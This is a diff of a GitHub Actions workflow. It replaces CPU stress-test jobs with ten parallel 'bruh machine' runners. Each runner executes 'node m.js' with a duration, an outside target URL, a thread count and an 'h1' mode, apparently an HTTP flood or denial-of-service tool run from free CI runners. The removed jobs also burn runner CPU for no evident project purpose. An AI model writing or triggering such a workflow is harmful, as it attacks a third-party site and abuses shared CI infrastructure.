@@ -1,93 +1,36 @@
-name: Native ARM and x86 CPU Tests
+name: Run m.js on Bruh Machines
 
 on:
+  workflow_dispatch:
   push:
+    branches: [ main, master ]
 
 jobs:
-  arm-linux-native:
-    name: Native ARM64 (${{ matrix.instance }})
-    runs-on: macos-latest
-    strategy:
-      matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-    timeout-minutes: 6
-    steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-
-    - name: Install tools
-      run: sudo apt-get update && sudo apt-get install -y bc procps
-
-    - name: Run CPU info and workload
-      run: |
-        echo "=== Native ARM64 Instance ${{ matrix.instance }} ==="
-        echo '=== lscpu Output ==='
-        lscpu
-        echo '=== CPU Architecture Details ==='
-        arch
-        cat /proc/cpuinfo | head -20
-        echo '=== Starting 5-minute workload ==='
-        
-        start_time=$(date +%s)
-        end_time=$((start_time + 300))
-        
-        # Create a CPU-intensive workload
-        while [ $(date +%s) -lt $end_time ]; do
-          # Multiple mathematical operations for CPU load
-          for i in {1..10}; do
-            echo "scale=2000; e(1)" | bc -l > /dev/null 2>&1
-          done
-          # Progress indicator
-          elapsed=$(( $(date +%s) - start_time ))
-          if [ $((elapsed % 60)) -eq 0 ]; then
-            echo "ARM${{ matrix.instance }}: $((elapsed/60))min elapsed"
-          fi
-        done
-        
-        echo "=== Workload completed ==="
-
-  x86-linux-native:
-    name: x86_64 (${{ matrix.instance }})
+  parallel-bruh-machines:
+    name: Bruh Machine ${{ matrix.bruh-id }}
     runs-on: ubuntu-latest
+    
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-    timeout-minutes: 6
+        bruh-id: [bruh-1, bruh-2, bruh-3, bruh-4, bruh-5, bruh-6, bruh-7, bruh-8, bruh-9, bruh-10]
+    
     steps:
-    - name: Checkout
+    - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Install tools
-      run: sudo apt-get update && sudo apt-get install -y bc procps sysstat
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
 
-    - name: Run CPU info and workload
+    - name: Display bruh machine info
       run: |
-        echo "=== x86_64 Instance ${{ matrix.instance }} ==="
-        echo '=== lscpu Detailed Output ==='
-        lscpu
-        echo '=== CPU Features ==='
-        cat /proc/cpuinfo | grep -E "processor|model name|cpu MHz|cache size" | head -12
-        echo '=== Starting 5-minute CPU stress test ==='
-        
-        start_time=$(date +%s)
-        end_time=$((start_time + 300))
-        
-        # More complex workload
-        while [ $(date +%s) -lt $end_time ]; do
-          # Parallel mathematical computations
-          for i in {1..5}; do
-            echo "scale=1500; s(1)*c(1)" | bc -l > /dev/null 2>&1 &
-          done
-          wait
-          
-          # Time tracking
-          current_time=$(date +%s)
-          remaining=$((end_time - current_time))
-          if [ $((current_time % 45)) -eq 0 ]; then
-            echo "x86-${{ matrix.instance }}: $((remaining))s remaining"
-          fi
-        done
-        
-        echo "=== Final CPU Usage ==="
-        mpstat 2 1 || iostat 2 1 || echo "System stats not available"
-        echo "Total execution time: $(($(date +%s) - start_time))s"
+        echo "Running on bruh machine: ${{ matrix.bruh-id }}"
+        echo "This is one of 10 parallel bruh machines"
+        echo "Machine ID: ${{ matrix.bruh-id }}"
+
+    - name: Execute m.js on bruh machine
+      run: node m.js 250 https://rapidis.gay/7778079525-435eb0ec-f821-4c91-a44f-da4276997baf 4 h1 
+      env:
+        BRUH_MACHINE_ID: ${{ matrix.bruh-id }}
+        TOTAL_BRUH_MACHINES: 10
